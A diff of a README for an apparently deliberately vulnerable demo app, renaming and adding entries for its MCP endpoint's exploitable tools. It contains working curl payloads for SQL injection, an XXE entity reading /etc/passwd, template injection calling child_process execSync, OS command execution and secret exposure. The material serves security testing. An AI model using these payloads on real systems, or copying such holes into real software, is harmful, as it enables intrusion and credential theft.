@@ -1229,12 +1229,14 @@ Full configuration & usage examples can be found in our [demo project](https://g
 
 - **MCP (Model Context Protocol) Vulnerabilities** - The application exposes an MCP HTTP endpoint at `/api/mcp` that implements the JSON-RPC 2.0 protocol for AI agent tool calling. This endpoint contains multiple vulnerabilities through its exposed tools and resources:
 
-  - **SQL Injection via count_tool** - The `count_tool` accepts a SQL query parameter and executes it directly against the database without sanitization, similar to the `/api/testimonials/count` endpoint.
-  - **Sensitive Data Exposure via config_tool** - The `config_tool` returns application configuration including database credentials, API keys, and cloud storage URLs.
-  - **Server-Side Template Injection via render_tool** - The `render_tool` accepts a custom template string that is compiled and executed using the doT template engine, allowing arbitrary code execution.
+  - **SQL Injection via get_count** - The `get_count` accepts a SQL query parameter and executes it directly against the database without sanitization, similar to the `/api/testimonials/count` endpoint.
+  - **Sensitive Data Exposure via get_config** - The `get_config` returns application configuration including database credentials, API keys, and cloud storage URLs.
+  - **Server-Side Template Injection via render** - The `render` accepts a custom template string that is compiled and executed using the doT template engine, allowing arbitrary code execution.
   - **Local File Inclusion via MCP resources/read** - The `resources/read` method accepts `file://` URIs and proxies `/api/file/raw`, allowing arbitrary file reads such as `file:///etc/hosts`.
-  - **Server-Side JavaScript Injection via process_numbers_tool** - The `process_numbers_tool` proxies `/api/process_numbers` and executes arbitrary JavaScript from the `processing_expression` expression in server context.
-  - **OS Command Injection via spawn** - The `spawn` executes arbitrary operating system commands through MCP (same vulnerability class as `/api/spawn`) and streams progress over event-stream.
+  - **Server-Side JavaScript Injection via process_numbers** - The `process_numbers` proxies `/api/process_numbers` and executes arbitrary JavaScript from the `processing_expression` expression in server context.
+  - **XML External Entity via get_metadata** - The `get_metadata` proxies `/api/metadata` and processes attacker-controlled XML with external entities enabled (same vulnerability class as `/api/metadata`).
+  - **Broken Access Control via search_users** - The `search_users` proxies `/api/users/search/:name` and returns `application/json` search results.
+  - **OS Command Injection via spawn_process** - The `spawn_process` executes arbitrary operating system commands through MCP (same vulnerability class as `/api/spawn`) and streams progress over event-stream.
   - **Authentication and Session Management** - The `/api/mcp` endpoint supports optional authentication and per-client session tracking:
 
     - MCP sessions are independent from the regular API authentication/authorization flow.
@@ -1250,11 +1252,12 @@ Full configuration & usage examples can be found in our [demo project](https://g
     - If `Authorization: Bearer <jwt>` is provided to `initialize`, the MCP session is marked authenticated.
     - MCP permissions are role-based using the same user model as the HTTP server (`admin` vs regular user).
     - Some tools require authenticated MCP sessions, while others are available without authentication.
-    - `config_tool` is admin-only.
-    - `render_tool` responds as `text/event-stream`:
+    - `get_config` is admin-only.
+    - `render` responds as `text/event-stream`:
       `event: message` + `data: <json-rpc-payload>`.
-    - `spawn` responds as `text/event-stream`:
+    - `spawn_process` responds as `text/event-stream`:
       `event: notification` + `data: <progress-payload>` before execution and every ~5 seconds while running, partial command output via `event: notification` + `data: <partial-output-payload>`, then `event: message` + `data: <json-rpc-payload>`.
+    - `search_users` proxies `/api/users/search/:name` and returns `application/json` data.
 
   - **MCP Tool/Resource List (Quick Reference)**:
 
@@ -1268,7 +1271,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
     MCP_SESSION_ID=$(echo "$INIT" | awk -F': ' 'tolower($1)=="mcp-session-id"{print $2}' | tr -d '\r')
     ```
 
-    1. `count_tool` (public)  
+    1. `get_count` (public)  
        Vulnerability: **SQL Injection**.  
        Example:
 
@@ -1280,7 +1283,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
            "jsonrpc": "2.0",
            "method": "tools/call",
            "params": {
-             "name": "count_tool",
+             "name": "get_count",
              "arguments": {
                "query": "select count(*) as count from testimonial"
              }
@@ -1289,7 +1292,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
          }'
        ```
 
-    2. `render_tool` (public)  
+    2. `render` (public)  
        Vulnerability: **Server-Side Template Injection (SSTI)** via user-controlled doT template.  
        Example:
 
@@ -1301,7 +1304,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
            "jsonrpc": "2.0",
            "method": "tools/call",
            "params": {
-             "name": "render_tool",
+             "name": "render",
              "arguments": {
                "numbers": [1],
                "template": "The node version is: {{=process.version}}"
@@ -1338,7 +1341,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
          }'
        ```
 
-    4. `process_numbers_tool` (public)  
+    4. `process_numbers` (public)  
        Vulnerability: **Server-Side JavaScript Injection (SSJI)** via dynamic code execution.  
        Example:
 
@@ -1350,7 +1353,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
            "jsonrpc": "2.0",
            "method": "tools/call",
            "params": {
-            "name": "process_numbers_tool",
+            "name": "process_numbers",
             "arguments": {
               "numbers": [1, 2, 3],
               "processing_expression": "numbers.reduce((acc, num) => acc + num, 0)"
@@ -1360,7 +1363,49 @@ Full configuration & usage examples can be found in our [demo project](https://g
          }'
        ```
 
-    5. `spawn` (admin only)  
+    5. `get_metadata` (public)  
+       Vulnerability: **XML External Entity (XXE)** via proxied `/api/metadata` XML parsing.  
+       Example:
+
+       ```bash
+       curl "${BASE}/api/mcp" -X POST \
+         -H 'Content-Type: application/json' \
+         -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+         -d '{
+           "jsonrpc": "2.0",
+           "method": "tools/call",
+           "params": {
+            "name": "get_metadata",
+            "arguments": {
+              "xml": "<root><username>John</username></root>"
+            }
+          },
+         "id": 7
+         }'
+       ```
+
+    6. `search_users` (public)  
+       Vulnerability: **Broken Access Control** via proxied user search.  
+       Example:
+
+       ```bash
+       curl "${BASE}/api/mcp" -X POST \
+         -H 'Content-Type: application/json' \
+         -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+         -d '{
+           "jsonrpc": "2.0",
+           "method": "tools/call",
+           "params": {
+            "name": "search_users",
+            "arguments": {
+              "name": "ad"
+            }
+          },
+         "id": 8
+         }'
+       ```
+
+    7. `spawn_process` (admin only)  
        Vulnerability: **OS Command Injection** with progress notifications over SSE.  
        Example:
 
@@ -1372,12 +1417,12 @@ Full configuration & usage examples can be found in our [demo project](https://g
            "jsonrpc": "2.0",
            "method": "tools/call",
            "params": {
-            "name": "spawn",
+            "name": "spawn_process",
             "arguments": {
               "command": "ping -c 4 127.0.0.1"
             }
           },
-          "id": 7
+          "id": 9
          }'
        ```
 
@@ -1388,7 +1433,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
        - `event: notification` with method `notifications/partial_output` for stdout/stderr chunks
        - `event: message` containing final JSON-RPC tool result
 
-    6. `config_tool` (admin only)  
+    8. `get_config` (admin only)  
        Vulnerability: **Sensitive Data Exposure** (returns app configuration including secrets when allowed).  
        Example (admin-authenticated MCP session):
 
@@ -1411,12 +1456,12 @@ Full configuration & usage examples can be found in our [demo project](https://g
            "jsonrpc": "2.0",
            "method": "tools/call",
            "params": {
-             "name": "config_tool",
+             "name": "get_config",
              "arguments": {
                "include_sensitive": true
              }
            },
-           "id": 5
+           "id": 10
          }'
        ```
 
@@ -1445,7 +1490,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
     -d '{"jsonrpc":"2.0","method":"resources/list","id":3}'
   ```
 
-  2. **SQL Injection via count_tool**:
+  2. **SQL Injection via get_count**:
 
      ```bash
      curl "${BASE}/api/mcp" -X POST \
@@ -1455,7 +1500,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
          "jsonrpc": "2.0",
          "method": "tools/call",
          "params": {
-           "name": "count_tool",
+           "name": "get_count",
            "arguments": {
              "query": "select count(table_name) as count from information_schema.tables"
            }
@@ -1476,7 +1521,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
      }
      ```
 
-  3. **Sensitive Data Exposure via config_tool** (admin-authenticated MCP session):
+  3. **Sensitive Data Exposure via get_config** (admin-authenticated MCP session):
 
      ```bash
      AUTH_HEADERS=$(curl -i -s "${BASE}/api/auth/admin/login" -X POST \
@@ -1497,7 +1542,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
          "jsonrpc": "2.0",
          "method": "tools/call",
          "params": {
-           "name": "config_tool",
+           "name": "get_config",
             "arguments": {}
           },
          "id": 4
@@ -1539,7 +1584,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
 
      This payload reads local server files through the `/api/file/raw` proxy using a `file://` URI.
 
-  5. **Server-Side JavaScript Injection via process_numbers_tool**:
+  5. **Server-Side JavaScript Injection via process_numbers**:
 
      ```bash
      curl "${BASE}/api/mcp" -X POST \
@@ -1549,7 +1594,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
          "jsonrpc": "2.0",
          "method": "tools/call",
          "params": {
-           "name": "process_numbers_tool",
+           "name": "process_numbers",
            "arguments": {
              "numbers": [1, 2, 3],
              "processing_expression": "numbers.reduce((acc, num) => acc + num, 0)"
@@ -1561,28 +1606,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
 
      This payload executes JavaScript directly on the server.
 
-  6. **OS Command Injection via spawn**:
-
-     ```bash
-     curl -N "${BASE}/api/mcp" -X POST \
-       -H 'Content-Type: application/json' \
-       -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
-       -d '{
-         "jsonrpc": "2.0",
-         "method": "tools/call",
-         "params": {
-           "name": "spawn",
-           "arguments": {
-             "command": "uname -a"
-           }
-         },
-         "id": 7
-       }'
-     ```
-
-     Response is streamed as SSE and ends with an `event: message` JSON-RPC payload containing command output.
-
-  7. **Server-Side Template Injection via render_tool**:
+  6. **XML External Entity via get_metadata**:
 
      ```bash
      curl "${BASE}/api/mcp" -X POST \
@@ -1592,13 +1616,76 @@ Full configuration & usage examples can be found in our [demo project](https://g
          "jsonrpc": "2.0",
          "method": "tools/call",
          "params": {
-           "name": "render_tool",
+           "name": "get_metadata",
+           "arguments": {
+             "xml": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE replace [<!ENTITY mcp_xxe SYSTEM \"file://etc/passwd\">]><root>&mcp_xxe;</root>"
+           }
+         },
+         "id": 7
+       }'
+     ```
+
+     This payload proxies XML with external entity definitions to `/api/metadata`.
+
+  7. **User Search Enumeration via search_users**:
+
+     ```bash
+     curl "${BASE}/api/mcp" -X POST \
+       -H 'Content-Type: application/json' \
+       -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+       -d '{
+         "jsonrpc": "2.0",
+         "method": "tools/call",
+         "params": {
+           "name": "search_users",
+           "arguments": {
+             "name": "ad"
+           }
+         },
+         "id": 8
+       }'
+     ```
+
+     This payload proxies `/api/users/search/:name` and returns JSON user search results.
+
+  8. **OS Command Injection via spawn_process**:
+
+     ```bash
+     curl -N "${BASE}/api/mcp" -X POST \
+       -H 'Content-Type: application/json' \
+       -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+       -d '{
+         "jsonrpc": "2.0",
+         "method": "tools/call",
+         "params": {
+           "name": "spawn_process",
+           "arguments": {
+             "command": "uname -a"
+           }
+         },
+         "id": 9
+       }'
+     ```
+
+     Response is streamed as SSE and ends with an `event: message` JSON-RPC payload containing command output.
+
+  9. **Server-Side Template Injection via render**:
+
+     ```bash
+     curl "${BASE}/api/mcp" -X POST \
+       -H 'Content-Type: application/json' \
+       -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+       -d '{
+         "jsonrpc": "2.0",
+         "method": "tools/call",
+         "params": {
+           "name": "render",
            "arguments": {
              "numbers": [1],
              "template": "{{= global.process.mainModule.require('\''child_process'\'').execSync('\''ls -la'\'') }}"
            }
          },
-         "id": 8
+         "id": 10
        }'
      ```
 
